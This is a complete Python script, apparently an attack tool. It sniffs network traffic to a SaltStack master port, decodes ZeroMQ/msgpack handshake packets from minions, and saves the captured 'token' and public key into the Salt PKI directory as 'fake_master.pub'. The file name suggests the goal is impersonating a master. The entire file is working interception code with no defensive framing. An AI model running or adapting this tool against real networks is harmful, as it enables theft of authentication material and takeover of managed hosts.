#!/usr/bin/env python
import argparse
import socket
import sys
import os

import zmq
import pcap
import dpkt
import msgpack

parser = argparse.ArgumentParser(description='Listens for salt-minion handshakes')
parser.add_argument('--interface', '-i', required=True, help='The interface to listen on')
parser.add_argument('--address', '-a', required=True, help='The IP address to listen for packets from')
parser.add_argument('--port', '-p', type=int, default=4506, help='The port to listen for packets on')
parser.add_argument('--output', '-o', default='/etc/salt/pki', help='Path to the salt PKI directory')

log = lambda x: sys.stderr.write(x + "\n"); sys.stderr.flush()


def main(args):
    listener = listen_to_salt_packets(args.interface, args.address, args.port)

    log("Listening for salt packets going to {address} on port {port}".format(**vars(args)))
    for time, packet, data in listener:
        log("Packet received")

        if not data:  # packet with no 0MQ goodness
            continue

        if 'token' not in data:  # don't care about anything other than token packets
            continue

        log("Found a token!")

        token_path = os.path.join(args.output, 'token')
        pubkey_path = os.path.join(args.output, 'fake_master.pub')

        log("Writing token to '%s'" % token_path)
        with open(token_path, 'w') as fp:
            fp.write(data['token'])

        log("Writing master pub key to '%s'" % pubkey_path)
        with open(pubkey_path, 'w') as fp:
            fp.write(data['pub_key'])

        break

def listen_to_salt_packets(interface, dest_ip, dest_port):
    packet_listener = pcap.pcap(interface)
    packet_listener.setfilter("tcp and dst host {dest_ip} and port {dest_port} "
                              "and tcp[tcpflags] & (tcp-push) != 0".format(**locals()))

    packet_parser = ZMQPacketParser()

    for timestamp, raw_packet in packet_listener:
        ethernet_packet = dpkt.ethernet.Ethernet(raw_packet)
        data = packet_parser.parse(ethernet_packet.data.data.data)
        parsed = msgpack.loads(data) if data else None
        yield timestamp, ethernet_packet, parsed

class ZMQPacketParser(object):
    """
    A horrible way of parsing wire-protocol ZMQ packets
    """
    def __init__(self):
        self._zmq_ctx = zmq.Context()
        self._zmq_sock = self._zmq_ctx.socket(zmq.PULL)
        self._port = self._zmq_sock.bind_to_random_port('tcp://127.0.0.1')

    def parse(self, data):
        self._send_data(data)

        events = self._zmq_sock.poll(100)
        if events:
            return self._zmq_sock.recv()

    def _send_data(self, data):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('127.0.0.1', self._port))
        sock.sendall(data)
        sock.close()

if __name__ == '__main__':
    args = parser.parse_args()
    main(args)
